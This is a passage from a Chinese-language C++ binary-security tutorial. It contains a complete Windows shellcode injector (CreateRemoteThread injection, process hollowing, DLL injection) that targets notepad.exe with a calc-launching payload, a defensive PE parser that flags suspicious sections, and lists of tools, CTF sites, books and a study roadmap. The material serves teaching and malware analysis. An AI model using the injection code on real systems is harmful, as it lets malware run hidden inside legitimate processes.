---

## 四、高级实战案例

### 4.1 高级 Shellcode 注入器

使用 C++ 实现进程注入和 Shellcode 执行技术。

```cpp
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <psapi.h>

#pragma comment(lib, "psapi.lib")

// ===== 查找目标进程 PID =====
DWORD FindProcessId(const char* processName) {
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
    
    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return 0;
    }
    
    do {
        if (_stricmp(pe32.szExeFile, processName) == 0) {
            CloseHandle(hSnapshot);
            return pe32.th32ProcessID;
        }
    } while (Process32Next(hSnapshot, &pe32));
    
    CloseHandle(hSnapshot);
    return 0;
}

// ===== 经典 Shellcode 注入 (CreateRemoteThread) =====
BOOL InjectShellcode(DWORD pid, unsigned char* shellcode, size_t scSize) {
    // 1. 打开目标进程
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        printf("OpenProcess 失败: %d\n", GetLastError());
        return FALSE;
    }
    
    // 2. 在远程进程分配内存
    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, scSize, 
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        printf("VirtualAllocEx 失败: %d\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // 3. 写入 shellcode
    SIZE_T written;
    if (!WriteProcessMemory(hProcess, remoteMem, shellcode, scSize, &written)) {
        printf("WriteProcessMemory 失败: %d\n", GetLastError());
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // 4. 创建远程线程执行 shellcode
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
    if (!hThread) {
        printf("CreateRemoteThread 失败: %d\n", GetLastError());
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // 等待执行完成（可选）
    WaitForSingleObject(hThread, 5000);
    
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return TRUE;
}

// ===== 进程空洞 (Process Hollowing) =====
BOOL ProcessHollowing(const char* targetPath, unsigned char* shellcode, size_t scSize) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    // 1. 以挂起状态创建目标进程
    if (!CreateProcessA(NULL, (LPSTR)targetPath, NULL, NULL, FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        printf("CreateProcess 失败: %d\n", GetLastError());
        return FALSE;
    }
    
    // 2. 获取进程入口点
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("GetThreadContext 失败: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }
    
    // 3. 读取 PEB 获取镜像基址
    LPVOID imageBase;
    SIZE_T read;
    ReadProcessMemory(pi.hProcess,
        (LPCVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)),  // PEB + ImageBaseAddress 偏移
        &imageBase, sizeof(LPVOID), &read);
    
    printf("镜像基址: 0x%p\n", imageBase);
    
    // 4. 卸载原镜像（可选，复杂实现略）
    // 5. 写入新的 PE 或 shellcode
    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, scSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    WriteProcessMemory(pi.hProcess, remoteMem, shellcode, scSize, &read);
    
    // 6. 修改入口点指向 shellcode
    #ifdef _WIN64
        ctx.Rip = (DWORD64)remoteMem;
    #else
        ctx.Eip = (DWORD)remoteMem;
    #endif
    
    // 7. 恢复线程执行
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;
}

// ===== DLL 注入 =====
BOOL DllInject(DWORD pid, const char* dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return FALSE;
    
    // 在远程进程分配内存存储 DLL 路径
    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    WriteProcessMemory(hProcess, remoteMem, dllPath, strlen(dllPath) + 1, NULL);
    
    // 获取 LoadLibraryA 地址（kernel32.dll 在各进程地址相同）
    FARPROC loadLib = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    
    // 创建远程线程加载 DLL
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)loadLib, remoteMem, 0, NULL);
    
    WaitForSingleObject(hThread, 5000);
    
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return TRUE;
}

// 使用示例
int main() {
    // 示例 shellcode (calc.exe)
    unsigned char shellcode[] = {
        0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
        0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
        0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
        0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
        0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
        0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
        0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
        0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
        0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
    };
    
    DWORD pid = FindProcessId("notepad.exe");
    if (pid) {
        printf("找到目标进程 PID: %d\n", pid);
        InjectShellcode(pid, shellcode, sizeof(shellcode));
    }
    
    return 0;
}
```

### 4.2 自定义 PE 解析器

手动解析 PE 文件结构，用于恶意代码分析。

```cpp
#include <windows.h>
#include <stdio.h>
#include <vector>
#include <string>

class PEParser {
private:
    BYTE* fileBuffer;
    size_t fileSize;
    PIMAGE_DOS_HEADER pDosHeader;
    PIMAGE_NT_HEADERS pNtHeaders;
    PIMAGE_SECTION_HEADER pSectionHeaders;
    
public:
    PEParser(const char* filePath) {
        FILE* f = fopen(filePath, "rb");
        if (!f) throw "无法打开文件";
        
        fseek(f, 0, SEEK_END);
        fileSize = ftell(f);
        fseek(f, 0, SEEK_SET);
        
        fileBuffer = new BYTE[fileSize];
        fread(fileBuffer, 1, fileSize, f);
        fclose(f);
        
        // 验证 DOS 头
        pDosHeader = (PIMAGE_DOS_HEADER)fileBuffer;
        if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
            delete[] fileBuffer;
            throw "无效的 DOS 头";
        }
        
        // 获取 NT 头
        pNtHeaders = (PIMAGE_NT_HEADERS)(fileBuffer + pDosHeader->e_lfanew);
        if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
            delete[] fileBuffer;
            throw "无效的 NT 签名";
        }
        
        // 获取节表头
        pSectionHeaders = IMAGE_FIRST_SECTION(pNtHeaders);
    }
    
    ~PEParser() {
        delete[] fileBuffer;
    }
    
    // 打印基本信息
    void PrintBasicInfo() {
        printf("=== PE 文件基本信息 ===\n");
        printf("机器类型: 0x%04X", pNtHeaders->FileHeader.Machine);
        if (pNtHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64)
            printf(" (x64)");
        else if (pNtHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_I386)
            printf(" (x86)");
        printf("\n");
        
        printf("节区数量: %d\n", pNtHeaders->FileHeader.NumberOfSections);
        printf("时间戳: 0x%08X\n", pNtHeaders->FileHeader.TimeDateStamp);
        printf("入口点: 0x%08X\n", pNtHeaders->OptionalHeader.AddressOfEntryPoint);
        printf("镜像基址: 0x%08llX\n", (ULONGLONG)pNtHeaders->OptionalHeader.ImageBase);
        printf("节区对齐: 0x%08X\n", pNtHeaders->OptionalHeader.SectionAlignment);
        printf("文件对齐: 0x%08X\n", pNtHeaders->OptionalHeader.FileAlignment);
        printf("子系统: %d\n", pNtHeaders->OptionalHeader.Subsystem);
    }
    
    // 打印节区信息
    void PrintSections() {
        printf("\n=== 节区信息 ===\n");
        printf("%-10s %-10s %-10s %-10s %-10s\n", 
            "名称", "虚拟大小", "虚拟地址", "原始大小", "原始偏移");
        
        for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
            char name[9] = {0};
            memcpy(name, pSectionHeaders[i].Name, 8);
            
            printf("%-10s 0x%08X 0x%08X 0x%08X 0x%08X  ",
                name,
                pSectionHeaders[i].Misc.VirtualSize,
                pSectionHeaders[i].VirtualAddress,
                pSectionHeaders[i].SizeOfRawData,
                pSectionHeaders[i].PointerToRawData);
            
            // 节区属性
            if (pSectionHeaders[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
                printf("X");
            if (pSectionHeaders[i].Characteristics & IMAGE_SCN_MEM_READ)
                printf("R");
            if (pSectionHeaders[i].Characteristics & IMAGE_SCN_MEM_WRITE)
                printf("W");
            printf("\n");
        }
    }
    
    // 打印导入表
    void PrintImports() {
        printf("\n=== 导入表 ===\n");
        
        DWORD importRVA = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
        if (!importRVA) {
            printf("无导入表\n");
            return;
        }
        
        PIMAGE_IMPORT_DESCRIPTOR pImportDesc = 
            (PIMAGE_IMPORT_DESCRIPTOR)(RvaToOffset(importRVA) + fileBuffer);
        
        while (pImportDesc->Name) {
            char* dllName = (char*)(RvaToOffset(pImportDesc->Name) + fileBuffer);
            printf("DLL: %s\n", dllName);
            
            PIMAGE_THUNK_DATA pThunk = 
                (PIMAGE_THUNK_DATA)(RvaToOffset(pImportDesc->OriginalFirstThunk) + fileBuffer);
            
            while (pThunk->u1.AddressOfData) {
                if (!(pThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)) {
                    PIMAGE_IMPORT_BY_NAME pImportByName = 
                        (PIMAGE_IMPORT_BY_NAME)(RvaToOffset(pThunk->u1.AddressOfData) + fileBuffer);
                    printf("  - %s\n", pImportByName->Name);
                } else {
                    printf("  - Ordinal: %d\n", IMAGE_ORDINAL(pThunk->u1.Ordinal));
                }
                pThunk++;
            }
            pImportDesc++;
        }
    }
    
    // 检测可疑特征
    std::vector<std::string> DetectSuspicious() {
        std::vector<std::string> findings;
        
        // 1. 检查非标准节区
        const char* standardSections[] = {".text", ".data", ".rdata", ".bss", 
            ".idata", ".edata", ".rsrc", ".reloc", ".tls", ".pdata"};
        int standardCount = sizeof(standardSections) / sizeof(standardSections[0]);
        
        for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
            char name[9] = {0};
            memcpy(name, pSectionHeaders[i].Name, 8);
            
            bool isStandard = false;
            for (int j = 0; j < standardCount; j++) {
                if (strcmp(name, standardSections[j]) == 0) {
                    isStandard = true;
                    break;
                }
            }
            
            if (!isStandard) {
                char buf[256];
                sprintf(buf, "非标准节区: %s", name);
                findings.push_back(buf);
            }
            
            // 2. 可写可执行节区
            if ((pSectionHeaders[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
                (pSectionHeaders[i].Characteristics & IMAGE_SCN_MEM_WRITE)) {
                char buf[256];
                sprintf(buf, "可写可执行节区: %s (W+X)", name);
                findings.push_back(buf);
            }
            
            // 3. 异常大的节区
            if (pSectionHeaders[i].Misc.VirtualSize > 10 * 1024 * 1024) {
                char buf[256];
                sprintf(buf, "异常大的节区: %s (%d MB)", name, 
                    pSectionHeaders[i].Misc.VirtualSize / (1024*1024));
                findings.push_back(buf);
            }
        }
        
        // 4. 检查入口点不在 .text 节
        DWORD entryPoint = pNtHeaders->OptionalHeader.AddressOfEntryPoint;
        bool entryInText = false;
        for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
            if (entryPoint >= pSectionHeaders[i].VirtualAddress &&
                entryPoint < pSectionHeaders[i].VirtualAddress + pSectionHeaders[i].Misc.VirtualSize) {
                char name[9] = {0};
                memcpy(name, pSectionHeaders[i].Name, 8);
                if (strcmp(name, ".text") == 0) entryInText = true;
                break;
            }
        }
        if (!entryInText) {
            findings.push_back("入口点不在 .text 节区（可能被加壳/混淆）");
        }
        
        return findings;
    }
    
private:
    DWORD RvaToOffset(DWORD rva) {
        for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
            if (rva >= pSectionHeaders[i].VirtualAddress &&
                rva < pSectionHeaders[i].VirtualAddress + pSectionHeaders[i].Misc.VirtualSize) {
                return rva - pSectionHeaders[i].VirtualAddress + pSectionHeaders[i].PointerToRawData;
            }
        }
        return 0;
    }
};

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("用法: %s <pe文件路径>\n", argv[0]);
        return 1;
    }
    
    try {
        PEParser parser(argv[1]);
        parser.PrintBasicInfo();
        parser.PrintSections();
        parser.PrintImports();
        
        printf("\n=== 可疑特征检测 ===\n");
        auto findings = parser.DetectSuspicious();
        if (findings.empty()) {
            printf("未发现明显可疑特征\n");
        } else {
            for (auto& f : findings) {
                printf("  [!] %s\n", f.c_str());
            }
        }
    } catch (const char* err) {
        printf("错误: %s\n", err);
        return 1;
    }
    
    return 0;
}
```

---

## 五、进阶学习资源

### 5.1 C++ 安全资源

- **C++ Core Guidelines**：https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines
- **SEI CERT C++ 编码标准**：https://wiki.sei.cmu.edu/confluence/display/cplusplus
- **OWASP C++ 安全**：https://cheatsheetseries.owasp.org/cheatsheets/CPlusPlus_Security_Cheat_Sheet.html

### 5.2 二进制安全工具

- **静态分析**：
  - IDA Pro / Ghidra — 逆向工程平台
  - Binary Ninja — 二进制分析
  - cppcheck — C++ 静态检查
  - clang-analyzer — Clang 静态分析

- **动态分析**：
  - x64dbg / OllyDbg — 调试器
  - WinDbg — Windows 调试
  - Process Monitor — 系统监控
  - API Monitor — API 调用监控

- **漏洞挖掘**：
  - AFL++ — 模糊测试
  - libFuzzer — LLVM 模糊测试
  - AddressSanitizer — 内存错误检测
  - Valgrind — 内存调试

### 5.3 恶意代码分析

- **恶意代码分析资源**：
  - Ghidra 官方文档：https://ghidra-sre.org/
  - IDA Pro 手册：https://hex-rays.com/ida-pro/
  - malwaretech.com：https://www.malwaretech.com/
  - any.run — 在线沙箱

### 5.4 CTF 与练习平台

- **pwnable.kr**：https://pwnable.kr/
- **pwnable.tw**：https://pwnable.tw/
- **Hack The Box**：https://www.hackthebox.com/
- **VulnHub**：https://www.vulnhub.com/
- **攻防世界**：https://adworld.xctf.org.cn/
- **BUUCTF**：https://buuoj.cn/

### 5.5 推荐书籍

- **C++ 编程**：
  - 《C++ Primer》
  - 《Effective C++》
  - 《深度探索 C++ 对象模型》

- **二进制安全**：
  - 《深入理解计算机系统》(CSAPP)
  - 《黑客攻防技术宝典：系统实战篇》
  - 《0day 安全：软件漏洞分析技术》
  - 《恶意代码分析实战》

- **逆向工程**：
  - 《加密与解密》
  - 《逆向工程核心原理》
  - 《C++ 反汇编与逆向分析技术揭秘》

### 5.6 社区与博客

- **看雪论坛**：https://bbs.pediy.com/
- **吾爱破解**：https://www.52pojie.cn/
- **FreeBuf**：https://www.freebuf.com/
- **安全客**：https://www.anquanke.com/
- **先知社区**：https://xz.aliyun.com/

### 5.7 进阶学习路线

**第 1 阶段：C++ 精通（2-3月）**
- 模板与元编程
- 内存管理深入
- 多线程与并发
- STL 与 Boost

**第 2 阶段：系统编程（2-3月）**
- Windows API 深入
- PE/ELF 文件格式
- 汇编与反汇编
- 调试技术

**第 3 阶段：漏洞研究（3-6月）**
- 栈溢出与堆溢出
- Use-After-Free
- 格式化字符串
- 现代利用技术

**第 4 阶段：高级利用（3-6月）**
- ROP 链构造
- 绕过 DEP/ASLR
- 内核漏洞利用
- 浏览器漏洞

**第 5 阶段：实战与研究（持续）**
- CTF pwn 方向
- 漏洞挖掘与 CVE
- 恶意代码分析
- 工具开发
